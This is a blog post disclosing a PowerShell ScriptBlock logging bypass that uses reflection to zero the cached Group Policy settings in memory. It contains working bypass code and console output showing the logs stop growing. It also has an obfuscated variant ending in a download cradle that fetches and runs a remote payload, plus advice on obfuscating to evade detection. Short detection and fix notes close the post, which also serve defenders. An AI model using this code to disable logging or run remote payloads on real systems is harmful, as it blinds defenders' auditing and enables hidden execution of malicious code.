---
layout: post
title: "PowerShell ScriptBlock Logging Bypass"
date: 2017-5-18 00:00:01 -0600
tags: PowerShell
---

In Windows 10 / PowerShell 5.0, Microsoft introduced several new security features in PowerShell. These included the AMSI, Protected Event Logging, and maybe most importantly **ScriptBlock logging**. The comprehensive ScriptBlock logging now available in PowerShell has presented serious problems for attackers. Now, it is possible for defenders to have access to full logs recording all of an attacker's malicious PowerShell activity. This has caused some to even suggest that the offensive community should move away from PowerShell altogether.

But all is not lost! (At least not yet)

ScriptBlock logging is enabled through a Group Policy setting, and PowerShell will query that Group Policy setting each time it sees a new ScriptBlock to determine if it should be logged. But it would be silly to query Group Policy *for each ScriptBlock*! Why not just query once and cache the result in memory?

Luckily, PowerShell caches the results of it's Group Policies in a utility dictionary, so it can query once, remember the value, and simply return that value the next time someone asks for it. Efficiency! Just one problem. You might remember me talking about some PowerShell reflection black magic in [my last post, where I detailed a ScriptBlock Warning-level log bypass](({{site.baseurl}}/ScriptBlock-Warning-Event-Logging-Bypass.html)). Well, it gets worse. (Or better, however you look at it.) That cached Group Policy dictionary can be altered with some [Matt Graeber style reflection magic](https://twitter.com/mattifestation/status/735261176745988096):

```
$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
```

And for some evidence...

```
PS> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
0
PS> $GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
PS> $GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
PS> $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
PS> $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
PS> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
14
PS> "testing 123"
PS> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
14
```

There you have it: ScriptBlock Logging bypass! The best part? **All of this can be done in memory and without administrative privileges!** No need to edit Group Policy settings and no need to edit registry settings.

As a sidenote, remember that just like [the last bypass I posted]({{site.baseurl}}/ScriptBlock-Warning-Event-Logging-Bypass.html), this only takes affect *after the first ScriptBlock completes*. The bypass itself **will be logged**. With that in mind, I recommend:
* Using obfuscation on the "suspicious" strings in the bypass and/or using the Warning-level log bypass so that the first log doesn't get logged at the warning level
* Executing your payload using a remote download cradle (bonus points for [obfuscating the cradle](https://github.com/danielbohannon/Invoke-CradleCrafter)) so that the payload does not appear in logs at all

Example: [(Gist)](https://gist.github.com/cobbr/d8072d730b24fbae6ffe3aed8ca9c407)

```
$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils')."GetFie`ld"('cachedGroupPolicySettings', 'N'+'onPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
iex (New-Object Net.WebClient).downloadstring("https://myserver/mypayload.ps1")
```

But we could probably alter **any** of the values in this dictionary, right? So let's take a look at what's in there:

```
PS> [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static').GetValue($null)

Key                         Value
---                         -----
ProtectedEventLogging       {[EnableProtectedEventLogging, 1], [EncryptionCertificate, -----BEGIN CERTIFICATE-----...
Transcription               {[EnableTranscripting, 1], [OutputDirectory, ]}
ScriptBlockLogging          {[EnableScriptBlockLogging, 1], [EnableScriptBlockInvocationLogging, 1]}
ConsoleSessionConfiguration
ModuleLogging               {[EnableModuleLogging, 1], [ModuleNames, System.String[]]}

```

Hmm...

At first, this looks like there is potential for more abuse. Initial testing has showed that simply replacing the values in the dictionary does *not* work to bypass Transcription logging, Module logging, or ProtectedEventLogging, but this may be a piece of the puzzle and I'll certainly be looking into those next. In the meantime, be sure to **utilize these other logging types in addition to ScriptBlock logging!**

## Detection?

Unfortunately for defenders, there doesn't currently seem to be a lot of great ways to detect this happening. Group Policy and registry entries **will still indicate that all logging types are enabled**. The one piece of evidence you *will* have is the 1 ScriptBlock log that contains the bypass. Defenders could start searching for the bypass within logs, but this could probably be avoided using some more obfuscation techniques.

## Fix?

This could be fixed pretty easily by taking out the Group Policy cache used in PowerShell altogether, though I have no idea how much that could affect performance. If that solution is not a possibility, then this may be a tough fix.
